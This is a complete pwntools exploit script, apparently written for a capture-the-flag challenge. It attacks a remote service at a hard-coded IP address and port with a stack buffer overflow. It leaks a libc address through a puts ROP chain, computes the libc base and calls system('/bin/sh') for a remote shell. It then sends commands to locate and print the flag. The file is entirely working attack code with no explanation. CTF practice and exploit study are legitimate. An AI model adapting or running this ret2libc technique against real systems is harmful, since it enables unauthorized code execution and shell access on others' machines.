from pwn import *
elf = context.binary = ELF("./chall")

#p = process(['./ld-2.35.so', '--library-path', '.', './chall'])
p = remote("34.133.69.112", 10007)

offset = 0x48
pop_rdi = p64(0x4012bd)
ret_addr = p64(0x40101a)
plt_puts = p64(elf.plt['puts'])
got_puts = p64(elf.got['puts'])

payload = flat(
    b'a' * offset,
    pop_rdi, got_puts, plt_puts,
    elf.sym['vuln']
)

p.sendlineafter(b'Enter your input: ', payload)
p.recvline()

leaked_puts = u64(p.recvline().strip()[:6].ljust(8, b'\x00'))
log.info(f"Leaked PUTS: {hex(leaked_puts)}")

libc = ELF('./libc.so.6', checksec=False)
libc.address = leaked_puts - libc.symbols['puts']
log.info(f"Libc base: {hex(libc.address)}")

system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))

payload = flat(
    b'a' * offset,
    pop_rdi, binsh, ret_addr, system
)

p.sendlineafter(b'Enter your input: ', payload)
p.sendline(b'cd ../..')
p.sendline(b'cd flag')
p.sendline(b'cat *')

flag = p.recvall(timeout=1).strip().decode()
log.success(f"Flag found! {flag}")

p.close()
